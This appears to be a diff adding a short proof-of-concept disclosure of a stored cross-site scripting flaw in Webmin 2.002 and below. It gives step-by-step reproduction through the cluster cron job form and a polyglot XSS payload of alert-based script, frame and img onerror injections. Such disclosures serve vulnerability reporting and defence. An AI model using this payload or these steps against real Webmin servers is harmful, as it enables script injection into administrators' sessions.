@@ -1,0 +1,18 @@
+#Title : Webmin XSS
+#Researcher : Tisha Manandhar
+#Vendor : Webmin
+#Script Demo Url : https://127.0.0.1:10000/cluster-cron/?xnavigation=1
+#Version Affected : 2.002 and below
+#Date : 15 September 2023
+# Step 1 : Go to admin login
+# Step 2 : Navigate to webmin tab.
+# Step 3 : Go to cluster.
+# Step 4 : Go to cluster cron jobs.
+# Step 5 : Click on create a new cluster cron job.
+# Step 6 : In the input field "Execute cron job as ".
+# Step 7 : Insert the following payload.
+''' javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)// 
+'''
+# Step 8 : In other input field fill as required.
+
+XSS will execute. 
